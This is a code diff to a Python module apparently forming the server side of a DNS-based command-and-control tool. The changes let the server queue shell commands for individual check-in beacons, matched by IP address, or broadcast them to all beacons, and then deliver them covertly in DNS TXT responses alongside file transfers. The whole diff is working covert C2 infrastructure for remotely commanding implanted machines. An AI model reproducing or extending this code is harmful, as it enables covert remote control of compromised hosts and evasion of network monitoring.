@@ -2,7 +2,7 @@
     File containing classes and functions to handle a DNS Response
     @author Dosh, JRoc
 """
-import struct, sqlite3, zlib
+import struct
 
 """
     Class to represent a DNS Response and functions to build it
@@ -20,6 +20,7 @@ class DNSResponse:
         self.packet = None
         self.txt = txt
         self.commands = server.commands # commands to execute
+        self.beacons = server.bList     # list of beacons to send to
         self.f = server.f               # if file is present
         self.fName = server.fName       # name of file
         self.fSize = server.fSize       # size of file to load
@@ -28,7 +29,7 @@ class DNSResponse:
         self.server = server
         self.frag = False               # if the file needs to be fragmented
         self.sendName = False           # if were sending the file name to the beacon
-
+        self.sendAll = server.sendAll   # send commands to any beacon
 
     """
         Packs data into a binary struct to send as a
@@ -87,11 +88,29 @@ class DNSResponse:
                     self.server.fName = None
                     self.curr = 0
             else:
-                full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
-                length = len(full)
-                self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
-                self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
-                self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
+                if self.sendAll:
+                    full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
+                    length = len(full)
+                    self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
+                    self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
+                    self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
+                else:
+                    found = None
+                    for x in self.beacons:  # look through all the beacons queued up
+                        if self.addr[0] == x.ip:  # beacon was in the list, send its commands
+                            found = x
+                            full = ';'.join(cmd for cmd in x.cmds) # concat commands with semicolon
+                            length = len(full)
+                            self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
+                            self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
+                            self.packet += ''.join(struct.pack("c", x) for x in full) # loop & store command
+                            
+                    if found == None:   # valid beacon wasnt found
+                        self.packet += struct.pack("!H", 1) #RDLENGTH
+                        self.packet += struct.pack("B", 0)  #TXT LENGTH
+                    else:
+                        self.beacons.remove(found)   # remove beacon from list 
+
         else:   # load IP for A record
             self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
             self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
@@ -181,6 +200,7 @@ def send_response(addr, server, dnsQuery, txt):
         response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
         server.sock.sendto(bytes(response.packet), addr)
 
-    if dnsQuery.checkin: server.add_beacon(addr)
+    if dnsQuery.checkin: server.add_beacon(addr[0])
+    server.bList = response.beacons     # update list if any were removed
     print addr
     print "Response sent"
